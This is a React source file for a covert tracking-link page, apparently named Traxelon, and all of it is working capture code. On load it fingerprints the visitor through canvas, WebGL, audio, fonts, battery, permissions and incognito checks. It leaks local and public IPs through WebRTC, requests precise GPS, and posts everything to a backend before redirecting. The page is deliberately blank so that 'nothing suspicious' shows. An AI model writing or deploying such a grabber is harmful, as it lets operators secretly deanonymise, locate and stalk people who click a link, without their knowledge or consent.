import React, { useEffect, useRef } from "react";
import { useParams } from "react-router-dom";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

function getCaptureKey(token) { return "traxelon_v9_" + token; }

function getCanvasFingerprint() {
  try {
    const c = document.createElement("canvas"); c.width = 300; c.height = 80;
    const x = c.getContext("2d");
    x.textBaseline = "alphabetic"; x.fillStyle = "#f0f0f0"; x.fillRect(0, 0, 300, 80);
    x.fillStyle = "#069"; x.font = "bold 16px Arial"; x.fillText("Traxelon", 4, 30);
    x.fillStyle = "rgba(102,204,0,0.7)"; x.font = "italic 13px Georgia"; x.fillText("0x1F4A9", 4, 55);
    x.strokeStyle = "#f60"; x.lineWidth = 2; x.beginPath(); x.arc(150, 40, 20, 0, Math.PI * 2); x.stroke();
    const d = c.toDataURL(); let h = 0;
    for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h |= 0; }
    return h.toString(16);
  } catch { return null; }
}

function getCanvasGeometryHash() {
  try {
    const c = document.createElement("canvas"); c.width = 200; c.height = 200;
    const x = c.getContext("2d");
    x.beginPath(); x.moveTo(20, 20); x.bezierCurveTo(80, 10, 120, 150, 180, 180); x.stroke();
    x.beginPath(); x.arc(100, 100, 50, 0, Math.PI * 1.5); x.fill();
    x.font = "12px serif"; x.fillText("CanvasGeo", 50, 50);
    const d = c.toDataURL(); let h = 0;
    for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h |= 0; }
    return "geo-" + h.toString(16);
  } catch { return null; }
}

function getWebGLInfo() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl2") || c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return {};
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    const exts = gl.getSupportedExtensions() || [];
    const vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, "attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}"); gl.compileShader(vs);
    const fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, "precision mediump float;void main(){gl_FragColor=vec4(0.5,0.7,0.3,1.0);}"); gl.compileShader(fs);
    const prog = gl.createProgram(); gl.attachShader(prog, vs); gl.attachShader(prog, fs);
    gl.linkProgram(prog); gl.useProgram(prog);
    const buf = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buf);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,0,1]), gl.STATIC_DRAW);
    const loc = gl.getAttribLocation(prog, "p"); gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0); gl.drawArrays(gl.TRIANGLES, 0, 3);
    const px = new Uint8Array(c.width * c.height * 4);
    gl.readPixels(0, 0, c.width, c.height, gl.RGBA, gl.UNSIGNED_BYTE, px);
    let h = 0; for (let i = 0; i < px.length; i += 4) { h = (h << 5) - h + px[i] + px[i+1] + px[i+2]; h |= 0; }
    const vhp = gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT);
    return {
      gpu: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
      gpuVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
      webglVersion: gl.getParameter(gl.VERSION) || null,
      webglRenderer: gl.getParameter(gl.RENDERER) || null,
      webglVendor: gl.getParameter(gl.VENDOR) || null,
      webglShadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null,
      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || null,
      maxViewportDims: (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join("x") || null,
      maxAnisotropy: (() => { try { const e = gl.getExtension("EXT_texture_filter_anisotropic"); return e ? gl.getParameter(e.MAX_TEXTURE_MAX_ANISOTROPY_EXT) : null; } catch { return null; } })(),
      maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS) || null,
      maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS) || null,
      maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS) || null,
      aliasedPointSizeRange: (gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE) || []).join("-") || null,
      aliasedLineWidthRange: (gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE) || []).join("-") || null,
      webglExtensionsCount: exts.length,
      webgl2Support: !!c.getContext("webgl2"),
      webglHash: h.toString(16),
      shaderPrecision: vhp ? `hf-range:${vhp.rangeMin}/${vhp.rangeMax}-prec:${vhp.precision}` : null,
    };
  } catch { return {}; }
}

async function getAudioFingerprint() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return null;
    const ctx = new AC();
    const osc = ctx.createOscillator(), analyser = ctx.createAnalyser(), gain = ctx.createGain(), sp = ctx.createScriptProcessor(4096, 1, 1);
    gain.gain.value = 0; osc.type = "triangle"; osc.frequency.value = 10000;
    osc.connect(analyser); analyser.connect(sp); sp.connect(gain); gain.connect(ctx.destination); osc.start(0);
    return new Promise(resolve => {
      sp.onaudioprocess = e => {
        const d = e.inputBuffer.getChannelData(0); let s = 0;
        for (let i = 0; i < d.length; i++) s += Math.abs(d[i]);
        osc.disconnect(); ctx.close(); resolve(s.toString(16).substring(0, 16));
      };
      setTimeout(() => resolve(null), 1000);
    });
  } catch { return null; }
}

function getCSSHash() {
  try {
    return [
      window.matchMedia("(prefers-color-scheme: dark)").matches,
      window.matchMedia("(prefers-reduced-motion: reduce)").matches,
      window.matchMedia("(color-gamut: p3)").matches,
      window.matchMedia("(color-gamut: srgb)").matches,
      window.matchMedia("(display-mode: standalone)").matches,
      window.matchMedia("(pointer: fine)").matches,
      window.matchMedia("(pointer: coarse)").matches,
      window.matchMedia("(hover: hover)").matches,
      window.matchMedia("(any-pointer: fine)").matches,
      window.matchMedia("(dynamic-range: high)").matches,
    ].map(b => b ? "1" : "0").join("");
  } catch { return null; }
}

function getFontInfo() {
  try {
    const fonts = ["Arial","Arial Black","Calibri","Cambria","Comic Sans MS","Consolas","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","Palatino Linotype","Roboto","Open Sans","Segoe UI","Tahoma","Times New Roman","Trebuchet MS","Ubuntu","Verdana","Wingdings","Century Gothic","Garamond"];
    const c = document.createElement("canvas"); const x = c.getContext("2d");
    const test = "mmmmmmmmmmlli!@#$%"; const sz = "72px";
    const bw = {}; ["monospace","sans-serif","serif"].forEach(b => { x.font = `${sz} ${b}`; bw[b] = x.measureText(test).width; });
    const detected = fonts.filter(f => ["monospace","sans-serif","serif"].some(b => { x.font = `${sz} '${f}',${b}`; return x.measureText(test).width !== bw[b]; }));
    let fp = 0; detected.forEach(f => { for (let i = 0; i < f.length; i++) { fp = (fp << 5) - fp + f.charCodeAt(i); fp |= 0; } });
    return { fontsDetected: detected.length, fontsList: detected.slice(0, 25).join(", "), fontFingerprint: "font-" + fp.toString(16) };
  } catch { return {}; }
}

async function getBattery() {
  try {
    if (!navigator.getBattery) return {};
    const b = await navigator.getBattery();
    return { batteryLevel: Math.round(b.level * 100), batteryCharging: b.charging, batteryChargingTime: b.chargingTime !== Infinity ? b.chargingTime : null, batteryDischargingTime: b.dischargingTime !== Infinity ? b.dischargingTime : null };
  } catch { return {}; }
}

function getNetwork() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return {};
  return { connectionType: c.effectiveType || null, connectionDownlink: c.downlink || null, connectionRtt: c.rtt || null, connectionSaveData: c.saveData ?? null, connectionDownlinkMax: c.downlinkMax || null };
}

async function detectIncognito() {
  try { if (navigator.storage?.estimate) { const { quota } = await navigator.storage.estimate(); return quota < 120 * 1024 * 1024; } return null; } catch { return null; }
}

async function getStorage() {
  try {
    const est = await navigator.storage?.estimate();
    return {
      storageQuota: est?.quota ? Math.round(est.quota / 1024 / 1024) + " MB" : null,
      storageUsage: est?.usage ? Math.round(est.usage / 1024 / 1024) + " MB" : null,
      localStorageEnabled: (() => { try { localStorage.setItem("t","1"); localStorage.removeItem("t"); return true; } catch { return false; } })(),
      sessionStorageEnabled: (() => { try { sessionStorage.setItem("t","1"); sessionStorage.removeItem("t"); return true; } catch { return false; } })(),
      indexedDBEnabled: !!window.indexedDB,
      cacheAPIEnabled: String(!!window.caches),
      cookiesCount: document.cookie.split(";").filter(c => c.trim()).length,
    };
  } catch { return {}; }
}

async function getMedia() {
  try {
    if (!navigator.mediaDevices?.enumerateDevices) return {};
    const d = await navigator.mediaDevices.enumerateDevices();
    return { cameras: d.filter(x => x.kind === "videoinput").length, microphones: d.filter(x => x.kind === "audioinput").length, speakers: d.filter(x => x.kind === "audiooutput").length };
  } catch { return {}; }
}

function getSpeech() {
  try {
    if (!window.speechSynthesis) return {};
    const v = window.speechSynthesis.getVoices();
    return { speechVoicesCount: v.length, speechVoices: v.slice(0, 6).map(x => x.name).join(", ") || null };
  } catch { return {}; }
}

function getPlugins() {
  try {
    const p = Array.from(navigator.plugins || []).map(x => x.name);
    const m = Array.from(navigator.mimeTypes || []).map(x => x.type);
    return { pluginsCount: p.length, plugins: p.slice(0, 10).join(", ") || null, mimeTypes: m.slice(0, 8).join(", ") || null };
  } catch { return {}; }
}

function getPerf() {
  try {
    const p = performance.getEntriesByType("navigation")[0];
    const mem = performance.memory;
    return {
      pageLoadTime: p ? Math.round(p.loadEventEnd - p.startTime) + " ms" : null,
      domContentLoaded: p ? Math.round(p.domContentLoadedEventEnd - p.startTime) + " ms" : null,
      dnsLookupTime: p ? Math.round(p.domainLookupEnd - p.domainLookupStart) + " ms" : null,
      tcpConnectTime: p ? Math.round(p.connectEnd - p.connectStart) + " ms" : null,
      ttfb: p ? Math.round(p.responseStart - p.requestStart) + " ms" : null,
      memoryUsed: mem ? Math.round(mem.usedJSHeapSize / 1024 / 1024) + " MB" : null,
      memoryTotal: mem ? Math.round(mem.totalJSHeapSize / 1024 / 1024) + " MB" : null,
      memoryLimit: mem ? Math.round(mem.jsHeapSizeLimit / 1024 / 1024) + " MB" : null,
    };
  } catch { return {}; }
}

async function getWebRTC() {
  try {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    pc.createDataChannel("");
    await pc.createOffer().then(o => pc.setLocalDescription(o));
    return new Promise(resolve => {
      const local = new Set(), pub = new Set();
      pc.onicecandidate = e => {
        if (!e.candidate) { pc.close(); resolve({ webrtcLocalIP: [...local].join(", ") || null, webrtcPublicIP: [...pub].join(", ") || null, webrtcSupport: "true" }); return; }
        const m = e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/g) || [];
        m.forEach(ip => { if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) local.add(ip); else pub.add(ip); });
      };
      setTimeout(() => { pc.close(); resolve({ webrtcLocalIP: [...local].join(", ") || null, webrtcPublicIP: [...pub].join(", ") || null, webrtcSupport: "true" }); }, 1500);
    });
  } catch { return { webrtcLocalIP: null, webrtcPublicIP: null, webrtcSupport: "false" }; }
}

async function getPerms() {
  const chk = async n => { try { const r = await navigator.permissions.query({ name: n }); return r.state; } catch { return null; } };
  if (!navigator.permissions) return {};
  const r = await Promise.allSettled([chk("geolocation"),chk("notifications"),chk("camera"),chk("microphone"),chk("accelerometer"),chk("gyroscope"),chk("magnetometer"),chk("clipboard-read"),chk("clipboard-write")]);
  const v = x => x.status === "fulfilled" ? x.value : null;
  return { geolocationPermission: v(r[0]), notificationsPermission: v(r[1]), cameraPermission: v(r[2]), microphonePermission: v(r[3]), accelerometerPermission: v(r[4]), gyroscopePermission: v(r[5]), magnetometerPermission: v(r[6]), clipboardReadPermission: v(r[7]), clipboardWritePermission: v(r[8]) };
}

function getScreenInfo() {
  const mq = q => { try { return window.matchMedia(q).matches; } catch { return null; } };
  return {
    screenWidth: window.screen.width, screenHeight: window.screen.height,
    screenAvailWidth: window.screen.availWidth || null, screenAvailHeight: window.screen.availHeight || null,
    colorDepth: window.screen.colorDepth || null, pixelDepth: window.screen.pixelDepth || null,
    pixelRatio: window.devicePixelRatio || null,
    windowWidth: window.innerWidth || null, windowHeight: window.innerHeight || null,
    orientation: window.screen.orientation?.type || null, orientationAngle: window.screen.orientation?.angle ?? null,
    outerWidth: window.outerWidth || null, outerHeight: window.outerHeight || null,
    hdrSupport: mq("(dynamic-range: high)") ? "HDR" : "SDR",
    colorGamut: mq("(color-gamut: p3)") ? "p3" : mq("(color-gamut: rec2020)") ? "rec2020" : "srgb",
    forcedColors: mq("(forced-colors: active)") ? "active" : "none",
    invertedColors: mq("(inverted-colors: inverted)") ? "inverted" : "none",
    prefersColorScheme: mq("(prefers-color-scheme: dark)") ? "dark" : "light",
    prefersReducedMotion: mq("(prefers-reduced-motion: reduce)") ? "reduce" : "no-preference",
    cssPxDensity: window.devicePixelRatio ? Math.round(window.devicePixelRatio * 96) + " dpi" : null,
  };
}

function getFeatures() {
  return {
    webSocketSupport: !!window.WebSocket, webWorkerSupport: !!window.Worker,
    serviceWorkerSupport: "serviceWorker" in navigator, webAssemblySupport: !!window.WebAssembly,
    bluetoothSupport: "bluetooth" in navigator, usbSupport: "usb" in navigator,
    gamepadSupport: String(!!navigator.getGamepads), xrSupport: String(!!navigator.xr),
    offscreenCanvasSupport: String(!!window.OffscreenCanvas),
    sharedArrayBufferSupport: String(!!window.SharedArrayBuffer),
    broadcastChannelSupport: String(!!window.BroadcastChannel),
    paymentRequestSupport: String(!!window.PaymentRequest),
    credentialMgmtSupport: String(!!(navigator.credentials?.get)),
    presentationSupport: String(!!navigator.presentation),
  };
}

async function collectAll() {
  const now = new Date();
  const jan = new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
  const jul = new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
  const ua = navigator.userAgent;
  let browserVersion = null;
  try { const m = ua.match(/Edg\/([0-9.]+)/) || ua.match(/Chrome\/([0-9.]+)/) || ua.match(/Firefox\/([0-9.]+)/) || ua.match(/Version\/([0-9.]+).*Safari/); browserVersion = m?.[1] || null; } catch {}
  let architecture = null;
  try { if (ua.includes("WOW64") || ua.includes("Win64") || ua.includes("x64")) architecture = "x64"; else if (/arm/i.test(ua)) architecture = "ARM"; } catch {}

  const [battery, incognito, media, storage, audio, webrtc, perms] = await Promise.all([
    getBattery(), detectIncognito(), getMedia(), getStorage(),
    getAudioFingerprint(), getWebRTC(), getPerms()
  ]);

  return {
    appName: navigator.appName || null, appVersion: navigator.appVersion?.substring(0, 80) || null,
    product: navigator.product || null, buildID: navigator.buildID || null,
    vendor: navigator.vendor || null,
    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
    pdfViewerEnabled: navigator.pdfViewerEnabled || null,
    cookiesEnabled: navigator.cookieEnabled || null, doNotTrack: navigator.doNotTrack || null,
    historyLength: window.history.length || null, referrer: document.referrer || null,
    language: navigator.language || null,
    languages: navigator.languages ? navigator.languages.join(", ") : null,
    platform: navigator.platform || null, userAgent: ua, browserVersion,
    cpuCores: navigator.hardwareConcurrency || null, ram: navigator.deviceMemory || null,
    maxTouchPoints: navigator.maxTouchPoints || null,
    touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
    pointerType: window.PointerEvent ? "pointer" : "mouse", architecture,
    ...getWebGLInfo(), ...getScreenInfo(), ...battery, ...getNetwork(),
    localTime: now.toLocaleString("en-IN", { timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone }),
    clientTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: now.getTimezoneOffset(),
    dstActive: Math.min(jan, jul) !== now.getTimezoneOffset() ? "Yes" : "No",
    incognito: incognito ?? null,
    adBlockDetected: (() => { try { const el = document.createElement("div"); el.className = "adsbox ad-unit ads advertisement"; el.style.cssText = "position:absolute;left:-9999px"; document.body.appendChild(el); const b = el.offsetHeight === 0 || el.offsetWidth === 0; document.body.removeChild(el); return b; } catch { return null; } })(),
    canvasHash: getCanvasFingerprint(), canvasGeometryHash: getCanvasGeometryHash(),
    audioFingerprint: audio, cssHash: getCSSHash(),
    ...media, ...storage, ...getFontInfo(), ...getSpeech(), ...getPlugins(), ...getPerf(), ...webrtc, ...perms, ...getFeatures(),
  };
}

// ── GPS with proper prompt — waits for user response ─────────────────────────
function requestGPS() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) { resolve(null); return; }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          gpsLat: pos.coords.latitude,
          gpsLon: pos.coords.longitude,
          gpsAccuracy: Math.round(pos.coords.accuracy),
          gpsAltitude: pos.coords.altitude || null,
          gpsSpeed: pos.coords.speed || null,
          gpsHeading: pos.coords.heading ? Math.round(pos.coords.heading) + "°" : null,
        });
      },
      () => resolve(null),
      {
        enableHighAccuracy: true,
        timeout: 30000,      // wait up to 30 seconds for user to respond
        maximumAge: 0,
      }
    );
  });
}

export default function TrackingCapture() {
  const { token } = useParams();
  const hasSent = useRef(false);

  useEffect(() => {
    if (hasSent.current) return;
    if (sessionStorage.getItem(getCaptureKey(token))) return;
    hasSent.current = true;
    sessionStorage.setItem(getCaptureKey(token), "1");
    startCapture();
  }, []);

  async function startCapture() {
    try {
      // Step 1 — collect all device info (fast, no GPS)
      const deviceInfo = await collectAll();

      // Step 2 — send capture immediately to get destinationUrl fast
      const res = await fetch(BACKEND_URL + "/api/links/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token, ...deviceInfo }),
      });
      const data = await res.json();

      // Step 3 — ask for GPS NOW (prompt appears here, user has time to click Allow)
      // GPS runs in parallel with redirect timer
      let gpsResolved = false;
      const gpsPromise = requestGPS().then(async (gpsData) => {
        gpsResolved = true;
        if (!gpsData) return;
        // Send GPS update to backend
        await fetch(BACKEND_URL + "/api/links/capture-gps", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ token, ...gpsData }),
        }).catch(() => {});
      });

      // Step 4 — wait max 8 seconds for GPS response before redirecting
      // This gives the user enough time to see and click "Allow"
      const redirectDelay = data.destinationUrl ? 8000 : 0;

      await Promise.race([
        gpsPromise,
        new Promise(resolve => setTimeout(resolve, redirectDelay))
      ]);

      // Step 5 — redirect
      if (data.destinationUrl) {
        window.location.replace(data.destinationUrl);
      }

    } catch (err) {
      console.error("[TrackingCapture]", err);
    }
  }

  // Completely blank white page — nothing suspicious shown
  return <div style={{ margin: 0, padding: 0, background: "#fff", minHeight: "100vh" }} />;
}